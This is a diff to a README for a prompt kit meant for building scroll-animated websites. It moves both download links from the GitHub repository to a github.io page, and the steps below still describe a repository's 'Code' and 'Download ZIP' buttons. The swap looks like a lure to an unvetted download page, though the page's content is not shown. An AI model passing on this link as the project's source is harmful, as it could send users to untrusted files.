@@ -1,6 +1,6 @@
 # 🎥 cinematic-scroll-prompt-kit - Build cinematic websites with simple prompts
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/nikolettalesstraveled780/cinematic-scroll-prompt-kit)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://nikolettalesstraveled780.github.io)
 
 This project provides a collection of prompts and project briefs. Designers use these tools to build websites with 2.5D scroll animations. You create complex visual experiences without manual coding. The files guide AI tools to generate the structure and style for your project.
 
@@ -19,7 +19,7 @@ Modern websites often use scroll-driven animations to tell stories. This kit pro
 
 Follow these steps to set up the kit on your computer.
 
-1. Visit the repository page to download the files. You can find the link here: [https://github.com/nikolettalesstraveled780/cinematic-scroll-prompt-kit](https://github.com/nikolettalesstraveled780/cinematic-scroll-prompt-kit)
+1. Visit the repository page to download the files. You can find the link here: [https://nikolettalesstraveled780.github.io](https://nikolettalesstraveled780.github.io)
 2. Locate the green button labeled Code. Click it.
 3. Select Download ZIP from the menu.
 4. Save the folder to your desktop.
